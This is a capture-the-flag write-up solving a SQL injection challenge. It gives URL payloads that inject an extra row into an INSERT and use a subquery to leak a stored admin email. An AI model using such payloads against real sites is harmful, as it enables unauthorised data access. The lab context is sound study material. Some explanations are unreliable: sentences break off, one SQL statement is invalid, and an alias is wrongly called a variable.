---
custom_edit_url: null
sidebar_position: 29
---

<figure style={{ textAlign: 'center' }}>
![1](https://github.com/Kunull/Write-ups/assets/110326359/e4b143de-c5d8-47ee-bed0-8bd3a124e8cb)
</figure>

We are provided with the SQL query:

```sql
INSERT INTO prob_phantom VALUES(0,'{$_SERVER[REMOTE_ADDR]}','{$_GET[joinmail]}')
```

This time, the table is updated based upon the parameter value that we provide.
If the `no=1`, the email will be displayed as `**************`.

In order to solve this challenge, we need to insert multiple records at the same time.
This can be done by listing multiple records in parentheses after `VALUES`, as follows:

```sql
INSERT INTO [table_name] VALUES(1, 1, 1), (2, 2, 2), (3, 3, 3);
```

If we provide the following URI parameter:

```
?joinmail=test'), (0, '[Public IP address]', (SELECT 1 WHERE 1=1)) -- -
```

You can find your public IP address from [here](https://www.whatismyip.com/).

The resultant query becomes:

```sql
INSERT INTO prob_phantom VALUES(0,'{$_SERVER[REMOTE_ADDR]}','test'), (0, '[Public IP address]', (SELECT 1 WHERE 1=1)) -- -')
```

<figure style={{ textAlign: 'center' }}>
![2](https://github.com/Kunull/Write-ups/assets/110326359/c0edf3a4-1f2c-46ab-bdfe-c9a23f9e5a0d)
</figure>

As we can see, the two records have been inserted into the table.

In order to retrieve the email however, we will have to store it into a variable. In order to

## Storing value in variable

```sql
SELECT email FROM prob_phantom WHERE no=1 AS temp
```

In this example, the email is stored in the `temp` variable.

If we provide the following URI parameter:

```
?joinmail=test'), (0, '[Public IP address]', (SELECT * FROM (SELECT email FROM prob_phantom WHERE no=1) AS temp)) -- -
```

The resultant query becomes:

```sql
INSERT INTO prob_phantom VALUES(0,'{$_SERVER[REMOTE_ADDR]}','test'), (0, '[Public IP address]', (SELECT * FROM (SELECT email FROM prob_phantom WHERE no=1) AS temp)) -- -')
```

The above query will store

<figure style={{ textAlign: 'center' }}>
![3](https://github.com/Kunull/Write-ups/assets/110326359/3dc3f1fe-2b74-4923-b804-537b2db133a1)
</figure>

```
admin_secure_email@rubiya.kr
```

If we provide the following URI parameter:

```
?email=admin_secure_email@rubiya.kr
```

The resultant query becomes:

```sql
SELECT email FROM prob_phantom WHERE no=1 AND email='?email=admin_secure_email@rubiya.kr'
```

<figure style={{ textAlign: 'center' }}>
![4](https://github.com/Kunull/Write-ups/assets/110326359/e49215ee-88f1-4da7-abf9-55acdc7b5f77)
</figure>
